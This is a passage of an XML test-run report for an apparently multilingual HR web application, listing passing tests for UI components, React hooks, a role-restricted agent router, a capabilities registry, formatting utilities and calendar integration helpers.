    <testcase classname="MotionButton applies whileHover scale class" name="MotionButton applies whileHover scale class" time="0.005">
    </testcase>
    <testcase classname="MotionButton applies whileTap scale class" name="MotionButton applies whileTap scale class" time="0.007">
    </testcase>
    <testcase classname="MotionButton applies custom className" name="MotionButton applies custom className" time="0.004">
    </testcase>
    <testcase classname="MotionButton is disabled when disabled prop is set" name="MotionButton is disabled when disabled prop is set" time="0.004">
    </testcase>
    <testcase classname="MotionButton has type submit by default (HTML default for buttons)" name="MotionButton has type submit by default (HTML default for buttons)" time="0.005">
    </testcase>
    <testcase classname="MotionSpan renders as a span element" name="MotionSpan renders as a span element" time="0.006">
    </testcase>
    <testcase classname="MotionSpan applies className" name="MotionSpan applies className" time="0.004">
    </testcase>
    <testcase classname="MotionSpan applies whileHover scale class" name="MotionSpan applies whileHover scale class" time="0.005">
    </testcase>
    <testcase classname="AnimatePresence renders children" name="AnimatePresence renders children" time="0.008">
    </testcase>
    <testcase classname="AnimatePresence renders multiple children" name="AnimatePresence renders multiple children" time="0.007">
    </testcase>
    <testcase classname="AnimatePresence accepts mode prop without crashing" name="AnimatePresence accepts mode prop without crashing" time="0.004">
    </testcase>
    <testcase classname="AnimatePresence renders null children gracefully" name="AnimatePresence renders null children gracefully" time="0.004">
    </testcase>
    <testcase classname="motion export object exports motion.div as MotionDiv" name="motion export object exports motion.div as MotionDiv" time="0.001">
    </testcase>
    <testcase classname="motion export object exports motion.button as MotionButton" name="motion export object exports motion.button as MotionButton" time="0.001">
    </testcase>
    <testcase classname="motion export object exports motion.span as MotionSpan" name="motion export object exports motion.span as MotionSpan" time="0.001">
    </testcase>
    <testcase classname="motion export object exports all common HTML tags" name="motion export object exports all common HTML tags" time="0.007">
    </testcase>
  </testsuite>
  <testsuite name="useMainRef" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:57" time="1.398" tests="3">
    <testcase classname="useMainRef returns a ref object" name="useMainRef returns a ref object" time="0.02">
    </testcase>
    <testcase classname="useMainRef ref.current is populated with main element after effect runs" name="useMainRef ref.current is populated with main element after effect runs" time="0.007">
    </testcase>
    <testcase classname="useMainRef queries for the main element" name="useMainRef queries for the main element" time="0.031">
    </testcase>
  </testsuite>
  <testsuite name="useActiveSection" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:57" time="1.408" tests="6">
    <testcase classname="useActiveSection returns null initially when no sections" name="useActiveSection returns null initially when no sections" time="0.01">
    </testcase>
    <testcase classname="useActiveSection observes all given section elements" name="useActiveSection observes all given section elements" time="0.007">
    </testcase>
    <testcase classname="useActiveSection observes only elements that exist" name="useActiveSection observes only elements that exist" time="0.006">
    </testcase>
    <testcase classname="useActiveSection returns the section with highest intersection ratio" name="useActiveSection returns the section with highest intersection ratio" time="0.006">
    </testcase>
    <testcase classname="useActiveSection returns null when no sections are intersecting" name="useActiveSection returns null when no sections are intersecting" time="0.004">
    </testcase>
    <testcase classname="useActiveSection updates active section when a new section becomes most visible" name="useActiveSection updates active section when a new section becomes most visible" time="0.006">
    </testcase>
  </testsuite>
  <testsuite name="useSwipe" errors="0" failures="0" skipped="1" timestamp="2026-07-28T12:22:57" time="1.382" tests="9">
    <testcase classname="useSwipe returns a ref object" name="useSwipe returns a ref object" time="0.019">
    </testcase>
    <testcase classname="useSwipe calls onSwipeLeft for left swipe" name="useSwipe calls onSwipeLeft for left swipe" time="0.01">
    </testcase>
    <testcase classname="useSwipe calls onSwipeRight for right swipe" name="useSwipe calls onSwipeRight for right swipe" time="0.006">
    </testcase>
    <testcase classname="useSwipe calls onSwipeUp for up swipe" name="useSwipe calls onSwipeUp for up swipe" time="0.005">
    </testcase>
    <testcase classname="useSwipe calls onSwipeDown for down swipe" name="useSwipe calls onSwipeDown for down swipe" time="0.008">
    </testcase>
    <testcase classname="useSwipe calls onSwipe with direction for any swipe" name="useSwipe calls onSwipe with direction for any swipe" time="0.007">
    </testcase>
    <testcase classname="useSwipe does NOT trigger for small movements below threshold" name="useSwipe does NOT trigger for small movements below threshold" time="0.005">
    </testcase>
    <testcase classname="useSwipe respects custom threshold value" name="useSwipe respects custom threshold value" time="0.005">
    </testcase>
    <testcase classname="useSwipe does NOT trigger for slow gestures beyond maxTime" name="useSwipe does NOT trigger for slow gestures beyond maxTime" time="0">
      <skipped/>
    </testcase>
  </testsuite>
  <testsuite name="useMediaQuery" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:58" time="1.125" tests="5">
    <testcase classname="useMediaQuery returns false when media query does not match" name="useMediaQuery returns false when media query does not match" time="0.012">
    </testcase>
    <testcase classname="useMediaQuery returns true when media query matches" name="useMediaQuery returns true when media query matches" time="0.004">
    </testcase>
    <testcase classname="useMediaQuery re-evaluates when query changes" name="useMediaQuery re-evaluates when query changes" time="0.007">
    </testcase>
    <testcase classname="useMediaQuery updates when matchMedia fires change event" name="useMediaQuery updates when matchMedia fires change event" time="0.006">
    </testcase>
    <testcase classname="useMediaQuery returns false when matchMedia is not available" name="useMediaQuery returns false when matchMedia is not available" time="0">
    </testcase>
  </testsuite>
  <testsuite name="useKeystrokeDynamics" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:58" time="1.209" tests="7">
    <testcase classname="useKeystrokeDynamics records key down and key up events with timing" name="useKeystrokeDynamics records key down and key up events with timing" time="0.015">
    </testcase>
    <testcase classname="useKeystrokeDynamics returns null for fewer than 4 keystrokes" name="useKeystrokeDynamics returns null for fewer than 4 keystrokes" time="0.005">
    </testcase>
    <testcase classname="useKeystrokeDynamics records Backspace key" name="useKeystrokeDynamics records Backspace key" time="0.006">
    </testcase>
    <testcase classname="useKeystrokeDynamics records standard characters with timing" name="useKeystrokeDynamics records standard characters with timing" time="0.005">
    </testcase>
    <testcase classname="useKeystrokeDynamics ignores special keys like Shift, Control" name="useKeystrokeDynamics ignores special keys like Shift, Control" time="0.006">
    </testcase>
    <testcase classname="useKeystrokeDynamics calculates stdDev values" name="useKeystrokeDynamics calculates stdDev values" time="0.008">
    </testcase>
    <testcase classname="useKeystrokeDynamics reset clears all events" name="useKeystrokeDynamics reset clears all events" time="0.007">
    </testcase>
  </testsuite>
  <testsuite name="routeToAgent" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:58" time="0.821" tests="88">
    <testcase classname="routeToAgent recruitment routing routes &quot;вакансия...&quot; (ru) to recruitment" name="routeToAgent recruitment routing routes &quot;вакансия...&quot; (ru) to recruitment" time="0.004">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;кандидат на позицию...&quot; (ru) to recruitment" name="routeToAgent recruitment routing routes &quot;кандидат на позицию...&quot; (ru) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;собеседование завтра...&quot; (ru) to recruitment" name="routeToAgent recruitment routing routes &quot;собеседование завтра...&quot; (ru) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;резюме нового сотрудника...&quot; (ru) to recruitment" name="routeToAgent recruitment routing routes &quot;резюме нового сотрудника...&quot; (ru) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;найм разработчика...&quot; (ru) to recruitment" name="routeToAgent recruitment routing routes &quot;найм разработчика...&quot; (ru) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;vacancy for senior dev...&quot; (en) to recruitment" name="routeToAgent recruitment routing routes &quot;vacancy for senior dev...&quot; (en) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;candidate pipeline status...&quot; (en) to recruitment" name="routeToAgent recruitment routing routes &quot;candidate pipeline status...&quot; (en) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;job opening in marketing...&quot; (en) to recruitment" name="routeToAgent recruitment routing routes &quot;job opening in marketing...&quot; (en) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;interview schedule...&quot; (en) to recruitment" name="routeToAgent recruitment routing routes &quot;interview schedule...&quot; (en) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;resume review...&quot; (en) to recruitment" name="routeToAgent recruitment routing routes &quot;resume review...&quot; (en) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;hiring manager...&quot; (en) to recruitment" name="routeToAgent recruitment routing routes &quot;hiring manager...&quot; (en) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;текущие вакансии...&quot; (ru) to recruitment" name="routeToAgent recruitment routing routes &quot;текущие вакансии...&quot; (ru) to recruitment" time="0">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;հավաքագրում...&quot; (hy) to recruitment" name="routeToAgent recruitment routing routes &quot;հավաքագրում...&quot; (hy) to recruitment" time="0.001">
    </testcase>
    <testcase classname="routeToAgent recruitment routing routes &quot;աշխատանքի առաջարկ...&quot; (hy) to recruitment" name="routeToAgent recruitment routing routes &quot;աշխատանքի առաջարկ...&quot; (hy) to recruitment" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;какие политики компании...&quot; to policy" name="routeToAgent policy routing routes &quot;какие политики компании...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;правила отпусков...&quot; to policy" name="routeToAgent policy routing routes &quot;правила отпусков...&quot; to policy" time="0.002">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;документы по комплаенс...&quot; to policy" name="routeToAgent policy routing routes &quot;документы по комплаенс...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;gdpr требования...&quot; to policy" name="routeToAgent policy routing routes &quot;gdpr требования...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;company policy on leave...&quot; to policy" name="routeToAgent policy routing routes &quot;company policy on leave...&quot; to policy" time="0.001">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;compliance rules...&quot; to policy" name="routeToAgent policy routing routes &quot;compliance rules...&quot; to policy" time="0.001">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;data protection policy...&quot; to policy" name="routeToAgent policy routing routes &quot;data protection policy...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;employee handbook...&quot; to policy" name="routeToAgent policy routing routes &quot;employee handbook...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;privacy consent...&quot; to policy" name="routeToAgent policy routing routes &quot;privacy consent...&quot; to policy" time="0.001">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;политика конфиденциальности...&quot; to policy" name="routeToAgent policy routing routes &quot;политика конфиденциальности...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;кодекс поведения...&quot; to policy" name="routeToAgent policy routing routes &quot;кодекс поведения...&quot; to policy" time="0.001">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;трудовой кодекс...&quot; to policy" name="routeToAgent policy routing routes &quot;трудовой кодекс...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;персональные данные...&quot; to policy" name="routeToAgent policy routing routes &quot;персональные данные...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;փաստաթուղթ...&quot; to policy" name="routeToAgent policy routing routes &quot;փաստաթուղթ...&quot; to policy" time="0.001">
    </testcase>
    <testcase classname="routeToAgent policy routing routes &quot;քաղաքականություն...&quot; to policy" name="routeToAgent policy routing routes &quot;քաղաքականություն...&quot; to policy" time="0">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;покажи аналитику по отпускам...&quot; to analytics" name="routeToAgent analytics routing routes &quot;покажи аналитику по отпускам...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;отчёт за месяц...&quot; to analytics" name="routeToAgent analytics routing routes &quot;отчёт за месяц...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;статистика посещаемости...&quot; to analytics" name="routeToAgent analytics routing routes &quot;статистика посещаемости...&quot; to analytics" time="0">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;тренды увольнений...&quot; to analytics" name="routeToAgent analytics routing routes &quot;тренды увольнений...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;analytics dashboard...&quot; to analytics" name="routeToAgent analytics routing routes &quot;analytics dashboard...&quot; to analytics" time="0">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;monthly report...&quot; to analytics" name="routeToAgent analytics routing routes &quot;monthly report...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;leave trends...&quot; to analytics" name="routeToAgent analytics routing routes &quot;leave trends...&quot; to analytics" time="0">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;attendance statistics...&quot; to analytics" name="routeToAgent analytics routing routes &quot;attendance statistics...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;employee turnover rate...&quot; to analytics" name="routeToAgent analytics routing routes &quot;employee turnover rate...&quot; to analytics" time="0">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;data insights...&quot; to analytics" name="routeToAgent analytics routing routes &quot;data insights...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;վերլուծություն...&quot; to analytics" name="routeToAgent analytics routing routes &quot;վերլուծություն...&quot; to analytics" time="0">
    </testcase>
    <testcase classname="routeToAgent analytics routing routes &quot;հաշվետվություն...&quot; to analytics" name="routeToAgent analytics routing routes &quot;հաշվետվություն...&quot; to analytics" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;мои цели на квартал...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;мои цели на квартал...&quot; to kpi" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;okr компании...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;okr компании...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;прогресс по задачам...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;прогресс по задачам...&quot; to kpi" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;стратегическая карта...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;стратегическая карта...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;balanced scorecard...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;balanced scorecard...&quot; to kpi" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;my objectives...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;my objectives...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;key results progress...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;key results progress...&quot; to kpi" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;performance review...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;performance review...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;north star metric...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;north star metric...&quot; to kpi" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;стратегия развития...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;стратегия развития...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;kpi показатели...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;kpi показатели...&quot; to kpi" time="0.001">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;նպատակ...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;նպատակ...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent kpi/goals routing routes &quot;կատարողական...&quot; to kpi" name="routeToAgent kpi/goals routing routes &quot;կատարողական...&quot; to kpi" time="0">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;hello&quot; to general" name="routeToAgent general fallback routes &quot;hello&quot; to general" time="0">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;как дела&quot; to general" name="routeToAgent general fallback routes &quot;как дела&quot; to general" time="0.001">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;что ты умеешь&quot; to general" name="routeToAgent general fallback routes &quot;что ты умеешь&quot; to general" time="0">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;помоги&quot; to general" name="routeToAgent general fallback routes &quot;помоги&quot; to general" time="0.001">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;thanks&quot; to general" name="routeToAgent general fallback routes &quot;thanks&quot; to general" time="0">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;good morning&quot; to general" name="routeToAgent general fallback routes &quot;good morning&quot; to general" time="0.001">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;привет&quot; to general" name="routeToAgent general fallback routes &quot;привет&quot; to general" time="0">
    </testcase>
    <testcase classname="routeToAgent general fallback routes &quot;бարև&quot; to general" name="routeToAgent general fallback routes &quot;бարև&quot; to general" time="0">
    </testcase>
    <testcase classname="routeToAgent role-based restrictions allows admin to use analytics agent" name="routeToAgent role-based restrictions allows admin to use analytics agent" time="0">
    </testcase>
    <testcase classname="routeToAgent role-based restrictions allows supervisor to use analytics agent" name="routeToAgent role-based restrictions allows supervisor to use analytics agent" time="0.001">
    </testcase>
    <testcase classname="routeToAgent role-based restrictions blocks employee from analytics agent (falls back to general)" name="routeToAgent role-based restrictions blocks employee from analytics agent (falls back to general)" time="0.001">
    </testcase>
    <testcase classname="routeToAgent role-based restrictions allows employee to use kpi agent" name="routeToAgent role-based restrictions allows employee to use kpi agent" time="0">
    </testcase>
    <testcase classname="routeToAgent role-based restrictions allows employee to use policy agent" name="routeToAgent role-based restrictions allows employee to use policy agent" time="0.001">
    </testcase>
    <testcase classname="routeToAgent role-based restrictions allows employee to use recruitment agent" name="routeToAgent role-based restrictions allows employee to use recruitment agent" time="0">
    </testcase>
    <testcase classname="routeToAgent edge cases handles empty string gracefully" name="routeToAgent edge cases handles empty string gracefully" time="0.001">
    </testcase>
    <testcase classname="routeToAgent edge cases handles whitespace-only input" name="routeToAgent edge cases handles whitespace-only input" time="0">
    </testcase>
    <testcase classname="routeToAgent edge cases handles special characters" name="routeToAgent edge cases handles special characters" time="0.001">
    </testcase>
    <testcase classname="routeToAgent edge cases handles very long input" name="routeToAgent edge cases handles very long input" time="0">
    </testcase>
    <testcase classname="routeToAgent edge cases routes mixed domain keywords to best match" name="routeToAgent edge cases routes mixed domain keywords to best match" time="0">
    </testcase>
    <testcase classname="buildAgentPrompt builds recruitment prompt with domain mention" name="buildAgentPrompt builds recruitment prompt with domain mention" time="0.002">
    </testcase>
    <testcase classname="buildAgentPrompt builds policy prompt with domain mention" name="buildAgentPrompt builds policy prompt with domain mention" time="0.001">
    </testcase>
    <testcase classname="buildAgentPrompt builds analytics prompt with domain mention" name="buildAgentPrompt builds analytics prompt with domain mention" time="0.001">
    </testcase>
    <testcase classname="buildAgentPrompt builds kpi prompt with domain mention" name="buildAgentPrompt builds kpi prompt with domain mention" time="0.001">
    </testcase>
    <testcase classname="buildAgentPrompt builds general prompt as base fallback" name="buildAgentPrompt builds general prompt as base fallback" time="0.002">
    </testcase>
    <testcase classname="buildAgentPrompt includes live data when provided" name="buildAgentPrompt includes live data when provided" time="0">
    </testcase>
    <testcase classname="buildAgentPrompt handles optional live data" name="buildAgentPrompt handles optional live data" time="0">
    </testcase>
    <testcase classname="buildAgentPrompt includes user context in all prompts" name="buildAgentPrompt includes user context in all prompts" time="0.004">
    </testcase>
    <testcase classname="buildAgentPrompt respects employee role in prompt" name="buildAgentPrompt respects employee role in prompt" time="0.001">
    </testcase>
    <testcase classname="getAgentSystemInstruction returns instruction for specialized agents" name="getAgentSystemInstruction returns instruction for specialized agents" time="0.002">
    </testcase>
    <testcase classname="getAgentSystemInstruction returns empty string for general agent" name="getAgentSystemInstruction returns empty string for general agent" time="0">
    </testcase>
    <testcase classname="getAgentSystemInstruction mentions redirect to general for out-of-domain questions" name="getAgentSystemInstruction mentions redirect to general for out-of-domain questions" time="0.001">
    </testcase>
    <testcase classname="AGENTS defines all 5 agents" name="AGENTS defines all 5 agents" time="0.002">
    </testcase>
    <testcase classname="AGENTS each agent has required fields" name="AGENTS each agent has required fields" time="0.017">
    </testcase>
    <testcase classname="AGENTS general agent is last (fallback)" name="AGENTS general agent is last (fallback)" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="admin/ai-governance page" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:58" time="1.345" tests="4">
    <testcase classname="admin/ai-governance page renders the page shell without crashing" name="admin/ai-governance page renders the page shell without crashing" time="0.066">
    </testcase>
    <testcase classname="admin/ai-governance page renders header with title" name="admin/ai-governance page renders header with title" time="0.01">
    </testcase>
    <testcase classname="analytics/reports page renders the page shell without crashing" name="analytics/reports page renders the page shell without crashing" time="0.013">
    </testcase>
    <testcase classname="analytics/reports page renders header with title" name="analytics/reports page renders header with title" time="0.006">
    </testcase>
  </testsuite>
  <testsuite name="AI_CAPABILITIES" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:58" time="1.237" tests="18">
    <testcase classname="AI_CAPABILITIES contains at least 25 capabilities" name="AI_CAPABILITIES contains at least 25 capabilities" time="0.003">
    </testcase>
    <testcase classname="AI_CAPABILITIES every capability has required fields" name="AI_CAPABILITIES every capability has required fields" time="0.137">
    </testcase>
    <testcase classname="AI_CAPABILITIES all capabilities have at least one required role" name="AI_CAPABILITIES all capabilities have at least one required role" time="0.013">
    </testcase>
    <testcase classname="AI_CAPABILITIES all capabilities have at least one keyword" name="AI_CAPABILITIES all capabilities have at least one keyword" time="0.013">
    </testcase>
    <testcase classname="AI_CAPABILITIES has unique capability ids" name="AI_CAPABILITIES has unique capability ids" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES all roles in requiredRole are valid" name="AI_CAPABILITIES all roles in requiredRole are valid" time="0.058">
    </testcase>
    <testcase classname="AI_CAPABILITIES has employee capabilities" name="AI_CAPABILITIES has employee capabilities" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES has supervisor-only capabilities" name="AI_CAPABILITIES has supervisor-only capabilities" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES has admin-only capabilities" name="AI_CAPABILITIES has admin-only capabilities" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES has superadmin-only capabilities" name="AI_CAPABILITIES has superadmin-only capabilities" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES employee capabilities cover basic HR functions" name="AI_CAPABILITIES employee capabilities cover basic HR functions" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES admin capabilities include management functions" name="AI_CAPABILITIES admin capabilities include management functions" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES superadmin capabilities include platform management" name="AI_CAPABILITIES superadmin capabilities include platform management" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES capabilities with action have valid route paths" name="AI_CAPABILITIES capabilities with action have valid route paths" time="0.011">
    </testcase>
    <testcase classname="AI_CAPABILITIES contains multilingual keywords (Russian)" name="AI_CAPABILITIES contains multilingual keywords (Russian)" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES contains multilingual keywords (Armenian)" name="AI_CAPABILITIES contains multilingual keywords (Armenian)" time="0.001">
    </testcase>
    <testcase classname="AI_CAPABILITIES helps employee check leave balance" name="AI_CAPABILITIES helps employee check leave balance" time="0.002">
    </testcase>
    <testcase classname="AI_CAPABILITIES helps employee book driver" name="AI_CAPABILITIES helps employee book driver" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="getInitials" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:59" time="1.16" tests="23">
    <testcase classname="getInitials returns single initial for first name only" name="getInitials returns single initial for first name only" time="0.002">
    </testcase>
    <testcase classname="getInitials returns two initials for first and last name" name="getInitials returns two initials for first and last name" time="0.001">
    </testcase>
    <testcase classname="getInitials returns first and last initial for multiple words" name="getInitials returns first and last initial for multiple words" time="0.001">
    </testcase>
    <testcase classname="getInitials handles lowercase names" name="getInitials handles lowercase names" time="0.001">
    </testcase>
    <testcase classname="getInitials handles names with extra spaces" name="getInitials handles names with extra spaces" time="0.001">
    </testcase>
    <testcase classname="getInitials returns question mark for empty string" name="getInitials returns question mark for empty string" time="0.001">
    </testcase>
    <testcase classname="getInitials handles whitespace only (returns empty string or null-like)" name="getInitials handles whitespace only (returns empty string or null-like)" time="0.001">
    </testcase>
    <testcase classname="getInitials handles single character name" name="getInitials handles single character name" time="0.001">
    </testcase>
    <testcase classname="getInitials handles null/undefined gracefully" name="getInitials handles null/undefined gracefully" time="0.001">
    </testcase>
    <testcase classname="getInitials handles non-ASCII characters" name="getInitials handles non-ASCII characters" time="0.001">
    </testcase>
    <testcase classname="getInitials handles hyphenated names (takes first letter of full name)" name="getInitials handles hyphenated names (takes first letter of full name)" time="0.001">
    </testcase>
    <testcase classname="getInitials handles names with dots" name="getInitials handles names with dots" time="0.001">
    </testcase>
    <testcase classname="getInitials returns single char for one-letter names" name="getInitials returns single char for one-letter names" time="0.008">
    </testcase>
    <testcase classname="formatFileSize formats 0 bytes" name="formatFileSize formats 0 bytes" time="0.001">
    </testcase>
    <testcase classname="formatFileSize formats bytes" name="formatFileSize formats bytes" time="0">
    </testcase>
    <testcase classname="formatFileSize formats kilobytes" name="formatFileSize formats kilobytes" time="0.002">
    </testcase>
    <testcase classname="formatFileSize formats megabytes" name="formatFileSize formats megabytes" time="0.001">
    </testcase>
    <testcase classname="formatFileSize formats gigabytes" name="formatFileSize formats gigabytes" time="0.002">
    </testcase>
    <testcase classname="formatFileSize formats terabytes" name="formatFileSize formats terabytes" time="0">
    </testcase>
    <testcase classname="formatFileSize handles fractional sizes correctly" name="formatFileSize handles fractional sizes correctly" time="0.002">
    </testcase>
    <testcase classname="formatFileSize uses correct unit for edge cases" name="formatFileSize uses correct unit for edge cases" time="0.003">
    </testcase>
    <testcase classname="formatFileSize handles very large numbers" name="formatFileSize handles very large numbers" time="0.012">
    </testcase>
    <testcase classname="formatFileSize rounds to 2 decimal places" name="formatFileSize rounds to 2 decimal places" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="generateICalendar" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:59" time="1.409" tests="23">
    <testcase classname="generateICalendar generates iCal with correct header" name="generateICalendar generates iCal with correct header" time="0.005">
    </testcase>
    <testcase classname="generateICalendar contains event UIDs" name="generateICalendar contains event UIDs" time="0.001">
    </testcase>
    <testcase classname="generateICalendar contains DTSTART/DTEND" name="generateICalendar contains DTSTART/DTEND" time="0.001">
    </testcase>
    <testcase classname="generateICalendar contains SUMMARY and DESCRIPTION" name="generateICalendar contains SUMMARY and DESCRIPTION" time="0.001">
    </testcase>
    <testcase classname="generateICalendar has VEVENT blocks" name="generateICalendar has VEVENT blocks" time="0.002">
    </testcase>
    <testcase classname="generateICalendar returns empty VEVENT for empty events" name="generateICalendar returns empty VEVENT for empty events" time="0.001">
    </testcase>
    <testcase classname="generateICalendar escapes special characters through generateICalendar" name="generateICalendar escapes special characters through generateICalendar" time="0.001">
    </testcase>
    <testcase classname="downloadICalFile creates a blob and triggers download" name="downloadICalFile creates a blob and triggers download" time="0.004">
    </testcase>
    <testcase classname="getGoogleCalendarAuthUrl returns auth URL with correct params" name="getGoogleCalendarAuthUrl returns auth URL with correct params" time="0.009">
    </testcase>
    <testcase classname="getGoogleCalendarAuthUrl throws when client ID is missing" name="getGoogleCalendarAuthUrl throws when client ID is missing" time="0.061">
    </testcase>
    <testcase classname="getOutlookAuthUrl returns Outlook auth URL" name="getOutlookAuthUrl returns Outlook auth URL" time="0.003">
    </testcase>
    <testcase classname="getOutlookAuthUrl throws when client ID is missing" name="getOutlookAuthUrl throws when client ID is missing" time="0.003">
    </testcase>
    <testcase classname="createGoogleCalendarEvent sends POST to Google Calendar API" name="createGoogleCalendarEvent sends POST to Google Calendar API" time="0.002">
    </testcase>
    <testcase classname="createGoogleCalendarEvent includes colorId based on leave type" name="createGoogleCalendarEvent includes colorId based on leave type" time="0.001">
    </testcase>
    <testcase classname="createGoogleCalendarEvent throws on non-ok response" name="createGoogleCalendarEvent throws on non-ok response" time="0.001">
    </testcase>
    <testcase classname="createOutlookCalendarEvent sends POST to Microsoft Graph API" name="createOutlookCalendarEvent sends POST to Microsoft Graph API" time="0.002">
    </testcase>
    <testcase classname="createOutlookCalendarEvent sets isAllDay to true" name="createOutlookCalendarEvent sets isAllDay to true" time="0.002">
    </testcase>
    <testcase classname="createOutlookCalendarEvent throws on non-ok" name="createOutlookCalendarEvent throws on non-ok" time="0.001">
    </testcase>
    <testcase classname="exchangeCodeForTokens throws when Google credentials missing" name="exchangeCodeForTokens throws when Google credentials missing" time="0.004">
    </testcase>
    <testcase classname="exchangeCodeForTokens throws when Microsoft credentials missing" name="exchangeCodeForTokens throws when Microsoft credentials missing" time="0.002">
    </testcase>
    <testcase classname="exchangeCodeForTokens exchanges Google code for tokens" name="exchangeCodeForTokens exchanges Google code for tokens" time="0.002">
    </testcase>
    <testcase classname="exchangeCodeForTokens exchanges Outlook code for tokens" name="exchangeCodeForTokens exchanges Outlook code for tokens" time="0.002">
    </testcase>
